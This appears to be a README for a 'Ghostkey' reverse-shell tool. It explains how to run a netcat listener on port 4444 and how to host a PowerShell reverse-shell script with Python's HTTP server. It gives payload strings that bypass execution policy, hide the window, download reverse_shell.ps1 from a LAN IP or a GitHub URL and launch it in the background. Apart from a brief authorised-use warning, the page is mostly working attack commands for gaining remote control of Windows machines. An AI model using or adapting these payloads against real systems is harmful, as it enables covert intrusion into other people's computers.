> [!warning] **Warning**
> **Warning** These should only be used on your own hardware or environments that you are specifically allowed in.

# Usage
### Server side:
> [!info] These is a simple tutorial for Debian based  distros 🐧

You will need netcat to be installed, If its not you can follow the following instructions:
1. `sudo apt update && upgrade -y` Update all system packages and references
3. `sudo apt install netcat-traditional -y` Install NetCat
4. `nc -h` 
Once installed start the listener on port 4444 by running
```
nc -lvpn 4444
```
Command explication:
- `nc`: NetCat
- `-l`: This option makes Netcat listen for incoming connections.
- `-v`: This option makes Netcat give more verbose output.
- `-p`: This option allows you to specify the source port.
- `-n`: This option tells Netcat not to do any DNS or service lookups on any addresses, hostnames or ports.
- `4444`: This is the port number. With the `-l` option, Netcat will listen on this port
> [!warning] Remember: these will allow any connections, so be carefull were and how you deploy it
### Reverse shell script retrival:
#### With server:
go to the directory were the payload is located and run
```bash
$ python3 -m http.server 80
```
these will use the http.server built in to python3 and make the directory available to the hole network, these allows you to run the Ghostkey to retrieve the revers shell script from your pc leaving no trace to a domain or other server, Remember to change the IP: on the string

```c++
payload = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri 'http://192.168.0.30/reverse_shell.ps1' -OutFile 'C:\\Users\\Public\\reverse_shell.ps1'; Start-Job -FilePath 'C:\\Users\\Public\\reverse_shell.ps1'\"";
```

#### With web page or other service: 
just change the Ip into a web page for example:
```c++
payload = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri 'http://github.com/user/reverse_shell.ps1' -OutFile 'C:\\Users\\Public\\reverse_shell.ps1'; Start-Job -FilePath 'C:\\Users\\Public\\reverse_shell.ps1'\"";
```
